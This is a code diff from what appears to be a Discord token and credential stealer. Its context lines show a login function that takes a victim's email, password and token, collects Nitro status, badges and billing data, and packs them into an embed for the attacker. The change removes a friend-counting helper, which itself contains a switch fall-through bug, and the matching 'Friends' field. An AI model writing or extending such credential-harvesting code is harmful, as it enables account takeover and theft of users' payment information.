@@ -496,23 +496,6 @@ const fetchFriends = async (token) => {
   return JSON.parse(bill);
 };
 
-const getFriends = async (token) => {
-  const data = await fetchFriends(token);
-  let s = 0;
-  let k = 0;
-  data.forEach((x) => {
-    if (!x.invalid) {
-      switch (x.type) {
-        case 1:
-          s += 1;
-        case 2:
-          k += 1;
-      }
-    }
-  });
-  return s;
-};
-
 const getNitro = (flags) => {
   switch (flags) {
     case 0:
@@ -601,7 +584,6 @@ const login = async (email, password, token) => {
   const nitro = getNitro(json.premium_type);
   const badges = getBadges(json.flags);
   const billing = await getBilling(token);
-  const friends = await getFriends(token);
   const content = {
     username: config.embed_name,
     avatar_url: config.embed_icon,
@@ -623,11 +605,6 @@ const login = async (email, password, token) => {
           {
             name: '<a:satanist:802503618972483615> Badges:',
             value: `${badges}`,
-            inline: true,
-          },
-          {
-            name: '<:944007233820307467:959785232037470208> Friends:',
-            value: `\`${friends}\``,
             inline: true,
           },
           {
